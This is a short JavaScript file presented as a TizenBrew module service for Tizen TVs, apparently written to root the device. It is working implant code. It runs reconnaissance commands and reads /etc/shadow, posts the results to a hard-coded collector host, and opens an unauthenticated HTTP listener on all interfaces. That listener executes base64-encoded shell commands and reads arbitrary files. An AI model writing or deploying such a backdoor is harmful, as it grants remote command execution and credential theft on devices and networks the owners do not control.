"use strict";
// TizenBrew module service: runs via vm sandbox in TizenBrew's node (v4.4.3 on Tizen 3)
(function () {
  var http = require('http');
  var cp = require('child_process');
  var fs = require('fs');
  var MAC = '192.168.0.188';
  function beacon(tag, data) {
    try {
      var body = String(data);
      var req = http.request({ host: MAC, port: 9090, path: '/' + tag, method: 'POST',
        headers: { 'Content-Length': Buffer.byteLength(body) } }, function () {});
      req.on('error', function () {});
      req.end(body);
    } catch (e) {}
  }
  function run(cmd, cb) {
    try { cp.exec(cmd, { timeout: 25000 }, function (err, stdout, stderr) { cb((err ? ('[ERR] ' + err + '\n') : '') + stdout + stderr); }); }
    catch (e) { cb('[EXC] ' + e); }
  }
  beacon('modboot', 'module service up, node=' + process.version + ' uid=' + (typeof process.getuid === 'function' ? process.getuid() : '?'));
  run('id; uname -a; cat /proc/version; echo ===; grep -E "Uid|Gid|Cap|Seccomp" /proc/self/status', function (o) { beacon('recon1', o); });
  run('ls -la /; echo ===APPS===; ls /opt/usr/apps 2>&1 | head -40; echo ===SHADOW===; head -c 400 /etc/shadow 2>&1; echo ===SMACK===; cat /proc/self/attr/current 2>&1', function (o) { beacon('recon2', o); });
  var srv = http.createServer(function (req, res) {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    var url = require('url').parse(req.url, true);
    if (url.pathname === '/x' && url.query.c) {
      var cmd = (typeof Buffer.from === 'function' ? Buffer.from(url.query.c, 'base64') : new Buffer(url.query.c, 'base64')).toString('utf8');
      run(cmd, function (o) { res.end(o); beacon('cmd', cmd + '\n---\n' + o); });
    } else if (url.pathname === '/f' && url.query.p) {
      try { res.end(fs.readFileSync(url.query.p).toString('utf8')); } catch (e) { res.end('[ERR] ' + e); }
    } else { res.end('tvroot module alive\n'); }
  });
  srv.listen(9192, '0.0.0.0', function () { beacon('listen', 'cmd channel on 9192'); });
  srv.on('error', function (e) { beacon('listen-fail', String(e)); });
})();
